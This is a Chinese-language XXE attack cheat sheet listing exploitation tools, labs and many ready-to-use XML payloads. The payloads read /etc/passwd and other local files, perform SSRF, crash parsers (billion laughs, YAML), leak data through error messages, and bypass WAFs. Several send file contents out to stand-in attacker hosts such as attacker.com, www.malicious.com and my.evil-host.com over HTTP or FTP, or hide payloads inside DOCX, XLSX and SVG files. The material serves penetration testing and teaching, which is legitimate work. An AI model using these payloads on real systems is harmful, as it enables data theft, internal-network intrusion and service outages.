# XML外部实体攻击

> XML外部实体攻击是针对解析XML输入并允许XML实体的应用程序的一种攻击类型。XML实体可以用来告诉XML解析器在服务器上获取特定内容。

**内部实体**：如果实体在DTD内声明，则称为内部实体。
语法：`<!ENTITY entity_name "entity_value">`

**外部实体**：如果实体在DTD外声明，则称为外部实体。由`SYSTEM`标识。
语法：`<!ENTITY entity_name SYSTEM "entity_value">`

## 摘要

- [工具](#工具)
- [实验室](#实验室)
- [检测漏洞](#检测漏洞)
- [利用XXE检索文件](#利用XXE检索文件)
  - [经典XXE](#经典XXE)
  - [经典XXE Base64编码](#经典XXE-Base64编码)
  - [XXE中的PHP包装器](#XXE中的PHP包装器)
  - [XInclude攻击](#XInclude攻击)
- [利用XXE执行SSRF攻击](#利用XXE执行SSRF攻击)
- [利用XXE执行拒绝服务](#利用XXE执行拒绝服务)
  - [十亿笑攻击](#十亿笑攻击)
  - [YAML攻击](#YAML攻击)
  - [参数笑攻击](#参数笑攻击)
- [利用基于错误的XXE](#利用基于错误的XXE)
  - [基于错误 - 使用本地DTD文件](#基于错误---使用本地DTD文件)
  - [基于错误 - 使用远程DTD](#基于错误---使用远程DTD)
- [利用盲XXE进行带外数据泄露](#利用盲XXE进行带外数据泄露)
  - [盲XXE](#盲XXE)
  - [XXE OOB攻击（Yunusov, 2013）](#XXE-OOB攻击（Yunusov---2013）)
  - [使用DTD和PHP过滤器的XXE OOB](#使用DTD和PHP过滤器的XXE-OOB)
  - [使用Apache Karaf的XXE OOB](#使用Apache-Karaf的XXE-OOB)
- [绕过WAF](#绕过WAF)
  - [通过字符编码绕过](#通过字符编码绕过)
- [Java中的XXE](#Java中的XXE)
- [异类文件中的XXE](#异类文件中的XXE)
  - [SVG中的XXE](#SVG中的XXE)
  - [SOAP中的XXE](#SOAP中的XXE)
  - [DOCX文件中的XXE](#DOCX文件中的XXE)
  - [XLSX文件中的XXE](#XLSX文件中的XXE)
  - [DTD文件中的XXE](#DTD文件中的XXE)
- [Windows本地DTD和侧信道泄露以披露HTTP响应/文件内容](#Windows本地DTD和侧信道泄露以披露HTTP响应/文件内容)

## 工具

- [xxeftp](https://github.com/staaldraad/xxeserv) - 支持FTP的XXE有效载荷的迷你Web服务器

  ```ps1
  sudo ./xxeftp -uno 443
  ./xxeftp -w -wps 5555
  ```

- [230-OOB](https://github.com/lc/230-OOB) - 通过[http://xxe.sh/](http://xxe.sh/)进行FTP检索文件内容和有效载荷生成的带外XXE服务器

  ```ps1
  $ python3 230.py 2121
  ```

- [XXEinjector](https://github.com/enjoiz/XXEinjector) - 使用直接或不同带外方法自动利用XXE漏洞的工具

  ```ps1
  # 枚举HTTPS应用程序中的/etc目录：
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
  # 使用gopher进行OOB方法枚举/etc目录：
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
  # 二次利用：
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
  # 使用HTTP带外方法和netdoc协议暴力破解文件：
  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
  # 使用直接利用枚举：
  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
  # 枚举未过滤端口：
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
  # 窃取Windows哈希：
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
  # 使用Java jar上传文件：
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
  # 使用PHP expect执行系统命令：
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
  # 测试XSLT注入：
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
  # 仅记录请求：
  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
  ```

- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - 用于将XXE/XML漏洞嵌入到不同文件类型（DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF）的工具

  ```ps1
  ruby server.rb
  ```

- [docem](https://github.com/whitel1st/docem) - 用于在docx、odt、pptx等中嵌入XXE和XSS有效载荷的实用程序

  ```ps1
  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
  ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
  ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
  ```

- [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - 旨在允许有效利用XXE漏洞的工具箱。

  ```ps1
  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
  ```

## 实验室

* [PortSwigger实验室用于XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
  * [利用外部实体进行XXE攻击以检索文件](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
  * [利用XXE执行SSRF攻击](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
  * [带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
  * [通过XML参数实体进行带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
  * [利用恶意外部DTD进行盲XXE数据泄露](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
  * [通过错误消息检索数据的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
  * [利用XInclude检索文件](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
  * [通过图像文件上传利用XXE](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
  * [通过重新利用本地DTD检索数据的XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
* [GoSecure高级XXE利用研讨会](https://gosecure.github.io/xxe-workshop) 

## 检测漏洞

基本实体测试，当XML解析器解析外部实体时，结果应该在`firstName`中包含"John"，在`lastName`中包含"Doe"。实体定义在`DOCTYPE`元素内部。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

在向服务器发送XML负载时，设置`Content-Type: application/xml`可能会有帮助。

## 利用XXE检索文件

### 经典XXE

我们尝试显示文件`/etc/passwd`的内容

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `SYSTEM` 和 `PUBLIC` 几乎是同义词。

```ps1
<!ENTITY % xxe PUBLIC "随机文本" "URL">
<!ENTITY xxe PUBLIC "任意文本" "URL">
```

### 经典XXE Base64编码

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP包装器在XXE内部

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### XInclude攻击

当你不能修改**DOCTYPE**元素时，使用**XInclude**来定位

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```



## 利用XXE执行SSRF攻击

XXE可以与[SSRF漏洞](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)结合，针对网络上的另一项服务。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```


## 利用XXE执行拒绝服务攻击

:warning: : 这些攻击可能会使服务或服务器崩溃，请勿在生产环境中使用。

### 十亿笑攻击

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### Yaml攻击

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 参数笑攻击

Billion Laughs攻击的一个变种，使用延迟解释参数实体，由Sebastian Pipping提出。

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```


## 利用基于错误的XXE

### 基于错误 - 使用本地DTD文件

简短的Linux系统上已存储的dtd文件列表；使用`locate .dtd`列出它们：

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

文件`/usr/share/xml/fontconfig/fonts.dtd`在第148行有一个可注入的实体`%constant`：`<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

最终的payload变为：

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```


### 基于错误 - 使用远程DTD

**触发XXE的有效载荷**

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**ext.dtd的内容**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

让我们分解有效载荷：

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
   这一行定义了一个名为file的外部实体，它引用了/etc/passwd文件的内容（类Unix系统文件，包含用户帐户详细信息）。
2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
   这一行定义了一个名为eval的实体，其中包含另一个实体定义。这个其他实体（error）旨在引用一个不存在的文件，并将file实体的内容（/etc/passwd的内容）附加到文件路径的末尾。`&#x25;`是URL编码的'`%`'，用于在实体定义中引用实体。
3. `%eval;`
   这一行使用eval实体，导致定义了error实体。
4. `%error;`
   最后，这一行使用error实体，它尝试访问一个包含/etc/passwd内容的文件路径的不存在文件。由于文件不存在，将会抛出错误。如果应用程序向用户报告错误并在错误消息中包含文件路径，则/etc/passwd的内容将作为错误消息的一部分被披露，泄露敏感信息。

## 利用盲XXE进行带外数据窃取

有时你可能无法在页面中看到结果输出，但你仍然可以通过带外攻击提取数据。

### 基础盲XXE

测试盲XXE最简单的方法是尝试加载远程资源，例如Burp Collaborator。

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

将`/etc/passwd`的内容发送到"www.malicious.com"，你可能只收到第一行。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### XXE OOB攻击（Yunusov, 2013）

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

存储在http://publicServer.com/parameterEntity_oob.dtd上的文件
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### 使用DTD和PHP过滤器的XXE OOB

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

存储在http://127.0.0.1/dtd.xml上的文件
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### Apache Karaf的XXE OOB

影响版本：

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

将XML文件发送到`deploy`文件夹。

参考 [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

## 使用本地DTD的XXE

在某些情况下，Web应用程序无法进行传出连接。即使是这样的有效负载，DNS名称也可能无法在外部解析：

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
<root>&test;</root>
```

如果基于错误的泄露是可能的，你仍然可以依赖于本地DTD来进行连接技巧。确认错误消息包括文件名的有效负载。

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">

    %local_dtd;
]>
<root></root>
```

假设像之前的有效负载返回了详细的错误信息。你可以开始指向本地DTD。找到一个DTD后，你可以提交如下有效负载。文件的内容将被放置在错误消息中。

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<root></root>
```

### Cisco WebEx

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```

### Citrix XenMobile Server

```
<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```

[使用不同DTD的其他有效负载](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)

## WAF绕过

### 通过字符编码绕过

XML解析器使用4种方法来检测编码：

* HTTP内容类型：`Content-Type: text/xml; charset=utf-8`
* 读取字节顺序标记（BOM）
* 读取文档的第一个符号
  * UTF-8 (3C 3F 78 6D)
  * UTF-16BE (00 3C 00 3F)
  * UTF-16LE (3C 00 3F 00 78 00 6D 00 6C)
* XML声明：`<?xml version="1.0" encoding="UTF-8"?>`

| 编码     | BOM      | 示例                                |              |
| -------- | -------- | ----------------------------------- | ------------ |
| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |

**示例**：我们可以使用[iconv](https://man7.org/linux/man-pages/man1/iconv.1.html)将有效负载转换为`UTF-16`以绕过某些WAF：

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

## Java中的XXE

来自三个XML处理接口（DOM、SAX、StAX）的10个不同Java类中的不安全配置可能导致XXE：

![XXE Java安全功能概览信息图表](https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png)

- [DocumentBuilderFactory (javax.xml.parsers.DocumentBuilderFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3a-documentbuilderfactory)
- [SAXBuilder (org.jdom2.input.SAXBuilder)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3b-saxbuilder)
- [SAXParserFactory (javax.xml.parsers.SAXParserFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3c-saxparserfactory)
- [SAXParser (javax.xml.parsers.SAXParser )](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3d-saxparser)
- [SAXReader (org.dom4j.io.SAXReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3e-saxreader)
- [TransformerFactory (javax.xml.transform.TransformerFactory) & SAXTransformerFactory (javax.xml.transform.sax.SAXTransformerFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3f-transformerfactory--saxtransformerfactory)
- [SchemaFactory (javax.xml.validation.SchemaFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3g-schemafactory)
- [Validator (javax.xml.validation.Validator)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3h-validator)
- [XMLReader (org.xml.sax.XMLReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3i-xmlreader)

参考

- [Semgrep - Java中的XML安全性](https://semgrep.dev/blog/2022/xml-security-in-java)
- [Semgrep - Java的XML外部实体预防](https://semgrep.dev/docs/cheat-sheets/java-xxe/)

## 异域文件中的XXE

### SVG中的XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**经典**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**通过SVG光栅化进行OOB**

*xxe.svg*

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">通过SVG光栅化的XXE</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

*xxe.xml*

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### SOAP中的XXE

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### DOCX文件中的XXE

Open XML文件的格式（在任何.xml文件中注入有效负载）：

- /_rels/.rels
- [Content_Types].xml
- 默认主文档部分
  - /word/document.xml
  - /ppt/presentation.xml
  - /xl/workbook.xml

然后更新文件 `zip -u xxe.docx [Content_Types].xml`

工具：https://github.com/BuffaloWill/oxml_xxe

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF（实验性）
JPG（实验性）
GIF（实验性）
```

### XLSX文件中的XXE

XLSX的结构：

```
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

根据您提供的文档内容，以下是翻译：

提取Excel文件：`7z x -oXXE xxe.xlsx`

重建Excel文件：

```bash
$ cd XXE
$ 7z u ../xxe.xlsx *
```

在`xl/workbook.xml`中添加您的盲XXE有效载荷。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

或者，在`xl/sharedStrings.xml`中添加您的有效载荷：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

使用远程DTD可以节省我们每次想要检索不同文件时重建文档的时间。
相反，我们构建一次文档，然后更改DTD。
使用FTP而不是HTTP可以检索更大的文件。

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
```

使用[xxeserv](https://github.com/staaldraad/xxeserv)提供DTD并接收FTP有效载荷：

```bash
$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### DTD文件中的XXE

上述大多数XXE有效载荷都需要同时控制DTD或`DOCTYPE`块以及`xml`文件。
在罕见的情况下，您可能只能控制DTD文件，而无法修改`xml`文件。例如，在中间人攻击（MITM）中。
当您只能控制DTD文件，而不能控制`xml`文件时，仍有可能使用此有效载荷实现XXE。

```xml
<!-- 将敏感文件的内容加载到变量中 -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- 使用该变量构造一个HTTP GET请求，将文件内容包含在URL中 -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## Windows本地DTD和旁道泄露以披露HTTP响应/文件内容

来自https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79

### 披露本地文件

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```

### 披露HTTP响应：

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```

## 参考资料

- [XML 外部实体 (XXE) 处理 - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
- [XML 外部实体防御速查表](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [在 SAML 接口中检测和利用 XXE](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html) - 2014年11月6日 - Von Christian Mainka
- [[Gist] staaldraad - XXE 有效载荷](https://gist.github.com/staaldraad/01415b990939494879b4)
- [[Gist] mgeeky - XML 攻击](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
- [在文件上传功能中利用 xxe - BLACKHAT WEBCAST - 2015年11月19日 - Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
- [XXE 无所不在！！！（包括苹果 iOS 的 Office 查看器）](http://en.hackdig.com/08/28075.htm)
- [从盲 XXE 到根级文件读取权限 - 2018年12月12日 - Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
- [我们如何获得谷歌生产服务器的读取权限](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/) 2014年4月11日 - detectify
- [在 UBER 的 26+ 个域名上通过盲 OOB XXE 被黑](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html) 2016年8月5日 - Raghav Bisht
- [通过 SAML 进行 OOB XXE](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf) 作者 Sean Melia @seanmeals
- [在 Uber 中利用 XXE 读取本地文件](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html) 2017年1月
- [SVG 中的 XXE](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/) 2016年6月22日 - YEO QUAN YANG
- [渗透测试 XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
- [利用本地 DTD 文件进行 XXE 利用](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/) - 2018年12月12日 - Arseniy Sharoglazov
- [Web 安全学院 >> XML 外部实体 (XXE) 注入 - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
- [自动化本地 DTD 发现以进行 XXE 利用](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation) - 2019年7月16日 - Philippe Arteau
- [利用 Excel 进行 XXE - 2018年11月12日 - MARC WICKENDEN](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
